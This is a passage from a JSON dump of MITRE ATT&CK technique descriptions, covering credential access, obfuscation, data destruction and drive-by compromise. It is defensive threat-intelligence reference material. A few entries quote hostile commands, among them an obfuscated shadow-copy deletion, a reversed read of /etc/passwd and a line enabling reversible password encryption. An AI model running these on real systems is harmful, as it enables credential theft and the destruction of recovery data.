contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).\n\n**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1601.001":{"id":"T1601.001","name":"Patch System Image","description":"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.^[[1]](https://drwho.virtadpt.net/images/killing_the_myth_of_cisco_ios_rootkits.pdf)^ ^[[2]](https://www.usenix.org/legacy/event/woot/tech/final_files/Cui.pdf)^ ^[[3]](http://2015.zeronights.org/assets/files/05-Nosenko.pdf)^ ^[[4]](https://www.recurity-labs.com/research/RecurityLabs_Developments_in_IOS_Forensics.pdf)^ ^[[5]](https://www.blackhat.com/presentations/bh-usa-09/NEILSON/BHUSA09-Neilson-NetscreenDead-SLIDES.pdf)^ Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1558.002":{"id":"T1558.002","name":"Silver Ticket","description":"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.^[[1]](https://adsecurity.org/?p=2011)^\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.^[[2]](https://adsecurity.org/?p=1515)^\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1213":{"id":"T1213","name":"Data from Information Repositories","description":"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.","platforms":["Linux","Windows","macOS","SaaS","Office 365","Google Workspace","IaaS"],"tactics":["Collection"],"campaigns":["SolarWinds Compromise"],"groups":["FIN6","Fox Kitten","APT28","Turla","LAPSUS$","APT29"]},"T1070.009":{"id":"T1070.009","name":"Clear Persistence","description":"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.^[[1]](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)^ Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).^[[2]](https://blog.talosintelligence.com/recent-cyber-attack/)^\n\nIn some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.^[[3]](https://research.nccgroup.com/2020/06/02/in-depth-analysis-of-the-new-team9-malware-family/)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1555.004":{"id":"T1555.004","name":"Windows Credential Manager","description":"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store)^^[[2]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN)^\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named `Policy.vpol`, typically located in the same folder as the credentials.^[[3]](https://www.passcape.com/windows_password_recovery_vault_explorer)^^[[4]](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)^\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. `vaultcmd.exe` is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as `CredEnumerateA`, may also be absued to list credentials managed by the Credential Manager.^[[5]](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea)^^[[6]](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)^\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running `rundll32.exe keymgr.dll KRShowKeyMgr` then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.^[[4]](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["OilRig","Stealth Falcon","Turla","Wizard Spider"]},"T1200":{"id":"T1200","name":"Hardware Additions","description":"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.^[[1]](https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html)^^[[2]](https://www.youtube.com/watch?v=lDvf4ScWbcQ)^^[[3]](https://www.youtube.com/watch?v=fXthwl6ShOg)^^[[4]](https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/)^","platforms":["Windows","Linux","macOS"],"tactics":["Initial Access"],"campaigns":[],"groups":["DarkVishnya"]},"T1505":{"id":"T1505","name":"Server Software Component","description":"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.^[[1]](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)^","platforms":["Windows","Linux","macOS","Network"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1485":{"id":"T1485","name":"Data Destruction","description":"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.^[[1]](https://www.symantec.com/connect/blogs/shamoon-attacks)^^[[2]](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)^^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^^[[5]](https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/)^^[[6]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^ Common operating system file deletion commands such as `del` and `rm` often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^^[[5]](https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/)^ In some cases politically oriented image files have been used to overwrite data.^[[2]](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)^^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).^[[1]](https://www.symantec.com/connect/blogs/shamoon-attacks)^^[[2]](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)^^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)^^[[6]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^.\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.^[[7]](https://threatpost.com/hacker-puts-hosting-service-code-spaces-out-of-business/106761/)^^[[8]](https://www.justice.gov/usao-ndca/pr/san-jose-man-pleads-guilty-damaging-cisco-s-network)^","platforms":["Windows","IaaS","Linux","macOS","Containers"],"tactics":["Impact"],"campaigns":[],"groups":["LAPSUS$","Lazarus Group","APT38","Gamaredon Group","Sandworm Team"]},"T1132.002":{"id":"T1132.002","name":"Non-Standard Encoding","description":"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.^[[1]](https://en.wikipedia.org/wiki/Binary-to-text_encoding)^ ^[[2]](https://en.wikipedia.org/wiki/Character_encoding)^ ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":[]},"T1556.001":{"id":"T1556.001","name":"Domain Controller Authentication","description":"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.^[[1]](https://www.secureworks.com/research/skeleton-key-malware-analysis)^","platforms":["Windows"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":["Chimera"]},"T1537":{"id":"T1537","name":"Transfer Data to Cloud Account","description":"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.^[[1]](https://www.justice.gov/file/1080281/download)^ ","platforms":["IaaS"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1027.006":{"id":"T1027.006","name":"HTML Smuggling","description":"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.^[[1]](https://www.menlosecurity.com/blog/new-attack-alert-duri)^^[[2]](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)^\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as `text/plain` and/or `text/html`. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as `msSaveBlob`.^[[1]](https://www.menlosecurity.com/blog/new-attack-alert-duri)^^[[3]](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)^^[[2]](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)^^[[4]](https://research.nccgroup.com/2017/08/08/smuggling-hta-files-in-internet-explorer-edge/)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT29"]},"T1556.005":{"id":"T1556.005","name":"Reversible Encryption","description":"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The `AllowReversiblePasswordEncryption` property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.^[[1]](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)^\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (`G$RADIUSCHAP`) from the Active Directory user-structure `userParameters`\n2. 16 byte randomly-generated value (`G$RADIUSCHAPKEY`) also from `userParameters`\n3. Global LSA secret (`G$MSRADIUSCHAPKEY`)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (`RASSFM.DLL`)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.^[[2]](http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html)^^[[3]](http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html)^\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.^[[4]](https://adsecurity.org/?p=2053)^ In PowerShell, an adversary may make associated changes to user settings using commands similar to `Set-ADUser -AllowReversiblePasswordEncryption $true`.","platforms":["Windows"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1027.010":{"id":"T1027.010","name":"Command Obfuscation","description":"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).^[[1]](https://www.akamai.com/blog/security/catch-me-if-you-can-javascript-obfuscation)^^[[2]](https://bromiley.medium.com/malware-monday-vbscript-and-vbe-files-292252c1a16)^\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.^[[3]](https://redcanary.com/threat-detection-report/techniques/powershell/)^ Many languages support built-in obfuscation in the form of base64 or URL encoding.^[[4]](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand)^ Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.^[[5]](https://bashfuscator.readthedocs.io/en/latest/Mutators/command_obfuscators/index.html)^^[[6]](https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html)^\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).^[[7]](https://twitter.com/rfackroyd/status/1639136000755765254)^\n\nTools such as `Invoke-Obfuscation` and `Invoke-DOSfucation` have also been used to obfuscate commands.^[[8]](https://github.com/danielbohannon/Invoke-DOSfuscation)^^[[9]](https://github.com/danielbohannon/Invoke-Obfuscation)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Frankenstein","C0021","Operation CuckooBees","C0018","Operation Wocao"],"groups":["Aquatic Panda","Sandworm Team","HEXANE","Leafminer","Cobalt Group","Fox Kitten","FIN6","APT32","Magic Hound","Wizard Spider","MuddyWater","Patchwork","Chimera","Silence","FIN8","FIN7","TA551","Sidewinder","TA505","Turla","GOLD SOUTHFIELD","LazyScripter","Gamaredon Group","Ember Bear","APT19"]},"T1070.004":{"id":"T1070.004","name":"File Deletion","description":"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.^[[1]](https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete)^ Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include `del` on Windows and `rm` or `unlink` on Linux and macOS.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job","Operation Honeybee","2015 Ukraine Electric Power Attack","Operation Wocao","SolarWinds Compromise"],"groups":["Aquatic Panda","FIN10","menuPass","BRONZE BUTLER","Tropic Trooper","TeamTNT","APT38","FIN5","Kimsuky","OilRig","FIN6","APT41","APT39","APT29","Wizard Spider","APT28","APT18","Evilnum","Dragonfly","Mustang Panda","Sandworm Team","Magic Hound","APT32","Cobalt Group","FIN8","Lazarus Group","APT3","The White Company","Chimera","Patchwork","Group5","Metador","Gamaredon Group","Volt Typhoon","Silence","TEMP.Veles","Rocke","Threat Group-3390","UNC2452","Operation Wocao","Honeybee","Dragonfly 2.0"]},"T1189":{"id":"T1189","name":"Drive-by Compromise","description":"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.^[[1]](http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/)^\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.^[[2]](https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/)^","platforms":["Windows","Linux","macOS","SaaS"],"tactics":["Initial Access"],"campaigns":["Operation Dust Storm","C0010"],"groups":["Transparent Tribe","RTM","PLATINUM","Windshift","Earth Lusca","APT38","Axiom","APT19","Darkhotel","Andariel","APT28","Dragonfly","Dark Caracal","Turla","Patchwork","Leviathan","APT32","BRONZE BUTLER","Lazarus Group","Threat Group-3390","Elderwood","APT37","Leafminer","Machete","PROMETHIUM","Windigo","Magic Hound","Dragonfly 2.0"]},"T1498":{"id":"T1498","name":"Network Denial of Service","description":"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes^[[1]](https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html)^ and to support other malicious activities, including distraction^[[2]](https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf)^, hacktivism, and extortion.^[[3]](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf)^\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Impact"],"campaigns":[],"groups":["APT28"]},"T1651":{"id":"T1651","name":"Cloud Administration Command","description":"Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.^[[1]](https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html)^^[[2]](https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview)^^[[3]](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d)^\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.^[[4]](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/)^","platforms":["IaaS","Azure AD"],"tactics":["Execution"],"campaigns":[],"groups":["APT29"]},"T1546.016":{"id":"T1546.016","name":"Installer Packages","description":"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.^[[1]](https://cpb-us-e1.wpmucdn.com/sites.psu.edu/dist/4/24696/files/2019/07/psumac2019-345-Installer-Package-Scripting-Making-your-deployments-easier-one-at-a-time.pdf)^\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.^[[2]](https://redcanary.com/blog/mac-application-bundles/)^^[[3]](https://objective-see.com/blog/blog_0x59.html)^\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged `Prebuild` and `Postbuild` events to run commands before or after a build when installing .msi files.^[[4]](https://securelist.com/operation-applejeus/87553/)^^[[5]](https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html#s-mscriptsinstact)^","platforms":["Linux","macOS","Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1595.001":{"id":"T1595.001","name":"Scanning IP Blocks","description":"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as 